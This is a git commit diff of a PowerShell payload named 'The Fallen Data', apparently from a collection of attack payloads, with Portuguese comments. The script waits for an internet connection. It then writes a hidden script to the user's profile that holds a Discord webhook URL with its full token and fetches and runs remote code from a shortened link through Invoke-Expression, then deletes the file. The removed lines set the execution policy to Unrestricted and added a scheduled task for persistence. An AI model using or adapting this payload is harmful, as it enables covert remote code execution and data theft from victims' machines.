df22f955a6fcf2699b66d8b30fc1b622b13d0e77
ClankPT <xu2000pt@gmail.com>
2024-03-21 12:03:30 +0000

    silence execute

--- Payloads/DataDagger/The Fallen Data.ps1
+++ Payloads/DataDagger/The Fallen Data.ps1
@@ -1,30 +1,42 @@
-# Permitir executar powershell
-Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
+# Função para verificar a conectividade de rede
+function Test-InternetConnection {
+    try {
+        $null = Test-Connection -ComputerName "www.google.com" -Count 1 -ErrorAction Stop
+        return $true
+    } catch {
+        return $false
+    }
+}
 
-# Define o conte�do do arquivo PowerShell
-$dc = 'https://discord.com/api/webhooks/token here'
+# Verificar a conectividade de rede
+if (-not (Test-InternetConnection)) {
+    while (-not (Test-InternetConnection)) {
+        Start-Sleep -Seconds 10
+    }
+}
+
+# Conexão de rede disponível. Executar o script aqui...
+# Define o conteúdo do arquivo PowerShell
+$dc = 'https://discord.com/api/webhooks/1185172334592655371/r9YAVpnfPK_W5z5D4F0WmkdFO6j7Vo7kSofgED4Ntol0ht1z_ZSMTZkJD7KcdoP30J1V'
 $scriptContent = @"
 Start-Sleep -Milliseconds 500
 `$dc = '$dc'
 Invoke-Expression (Invoke-WebRequest -Uri "http://cutt.ly/ClankPT" -UseBasicParsing).Content
 "@
 
-# Obter o diret�rio do perfil do usu�rio logado
+# Obter o diretório do perfil do usuário logado
 $userProfileDir = $env:USERPROFILE
 
-# Caminho completo do arquivo, incluindo o nome e a extens�o
-$filePath = Join-Path -Path $userProfileDir -ChildPath "Desktop.ps1"
+# Caminho completo do arquivo, incluindo o nome e a extensão
+$filePath = Join-Path -Path $userProfileDir -ChildPath ".teste.ps1"
 
-# Cria o arquivo com o conte�do especificado e define o atributo Hidden
+# Cria o arquivo com o conteúdo especificado e define o atributo Hidden
 $scriptContent | Out-File -FilePath $filePath -Encoding utf8
 Set-ItemProperty -Path $filePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
 
-# Executa o script imediatamente
+# Executa o script
 & $filePath
 
-# Cria um novo agendamento para executar o script PowerShell a cada 10 minutos
-$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-File `"$filePath`""
-$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(10) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration (New-TimeSpan -Days 365)
+# Apaga o arquivo após a execução do script
+Remove-Item -Path $filePath -Force
 
-# Registra a tarefa agendada
-Register-ScheduledTask -TaskName "ExecutarScriptPowerShell" -Action $action -Trigger $trigger -Description "Agendamento para executar o script PowerShell a cada 10 minutos"
